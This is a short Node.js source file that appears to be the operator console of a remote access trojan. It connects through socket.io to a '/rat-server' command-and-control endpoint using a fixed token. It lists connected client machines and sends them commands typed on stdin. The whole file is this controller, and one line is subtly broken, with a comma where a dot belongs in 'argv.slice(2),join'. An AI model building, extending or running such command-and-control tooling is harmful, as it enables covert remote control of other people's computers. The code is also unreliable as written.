const io = require('socket.io-client');

var socket;
const standard_input = process.stdin

standard_input.setEncoding('utf-8')

standard_input.on('data', function (data) {

    if(data === 'exit\n'){
        process.exit()
    }else
    {  
    	var argv = data.split(' ')
        switch(argv[0].trim('')) {
            case 'connect':
                socket = io(`http://${argv[1].trim('')}/?app_key=X-TOKEN&client_id=${argv[2].trim('')}`, {
                            path: '/rat-server'
                        });
                socket.on('connect', () => {
                    console.log('Connected to socket server!');
                });  
                
                socket.on('client_list', (client_socket_list) => {
                    console.log(client_socket_list)
                });

                socket.on('command', (cmd) => {
                    console.log(cmd);
                });
                
                socket.on('reconnecting', (attemptNumber) => {
                    console.log('Reconnecting - ' + attemptNumber);
                });
                break;
            case 'list':
                socket.emit('client_list');
                break;
            case 'command':
                socket.emit('command', argv[1] , argv.slice(2),join(' '));
                break;
        }
    }
})